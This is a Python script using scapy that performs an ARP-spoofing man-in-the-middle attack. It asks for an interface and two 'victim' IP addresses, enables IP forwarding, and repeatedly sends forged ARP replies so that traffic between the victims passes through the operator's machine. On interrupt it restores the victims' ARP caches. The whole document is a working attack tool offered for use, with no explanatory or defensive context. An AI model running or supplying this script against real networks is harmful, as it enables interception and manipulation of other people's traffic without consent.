from scapy.all import *
import sys
import os
import time

class MITMAttack:

    def __init__(self):
        self.interface = None
        self.victimAIP = None
        self.victimBIP = None

    def get_input(self):
        try:
            self.interface = input("[*] Enter Interface: ")
            self.victimAIP = input("[*] Enter Victim A IP: ")
            self.victimBIP = input("[*] Enter Victim B IP: ")
        except KeyboardInterrupt:
            print("\n[*] User Requested Shutdown")
            print("[*] Exiting...")
            sys.exit(1)

    def enable_ip_forwarding(self):
        print("\n[*] Enabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        print("\n[*] Restoring Targets...")
        victimAMAC = self.get_mac(self.victimAIP)
        victimBMAC = self.get_mac(self.victimBIP)
        send(ARP(op=2, pdst=self.victimBIP, psrc=self.victimAIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimAMAC), count=7)
        send(ARP(op=2, pdst=self.victimAIP, psrc=self.victimBIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimBMAC), count=7)
        print("\n[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Shutting Down...")
        sys.exit(1)

    def trick(self, bm, am):
        send(ARP(op=2, pdst=self.victimAIP, psrc=self.victimBIP, hwdst=am))
        send(ARP(op=2, pdst=self.victimBIP, psrc=self.victimAIP, hwdst=bm))

    def mitm(self):
        try:
            victiABMAC = self.get_mac(self.victimAIP)
        except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Couldn't Find Victim A MAC Address")
            print("[!] Exiting...")
            sys.exit(1)
        try:
            victimAMAC = self.get_mac(self.victimBIP)
        except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Couldn't Find Victim B MAC Address")
            print("[!] Exiting...")
            sys.exit(1)
        print("[*] Poisoning Targets...")
        while True:
            try:
                self.trick(victimAMAC, victiABMAC)
                time.sleep(1.5)
            except KeyboardInterrupt:
                self.reARP()
                break

if __name__ == "__main__":
    attack = MITMAttack()
    attack.get_input()
    attack.enable_ip_forwarding()
    attack.mitm()